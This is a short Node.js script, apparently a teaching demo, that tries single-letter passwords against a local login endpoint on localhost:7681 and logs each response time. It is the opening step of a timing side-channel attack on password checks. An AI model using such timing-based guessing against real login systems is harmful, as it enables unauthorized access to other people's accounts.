var fetch = require('node-fetch');

function tryLogin(password) {
    return fetch('http://localhost:7681/login', {
               method: 'POST',
               headers: { 'Content-Type': 'application/x-www-form-urlencoded', },
               body: `password=${password}`,
           });
}

let alphabet = 'abcdefghijklmnopqrstuvwxyz';

async function hackPassword() {
    for (let letter of alphabet) {
        let guess = letter;

        let startTime = new Date().getTime();
        let resp = await tryLogin(guess);
        let reqTime = new Date().getTime() - startTime;

        console.log(`guess: ${guess}  took ${reqTime} milliseconds  login success: ${resp.ok}`);
    }
}

hackPassword();
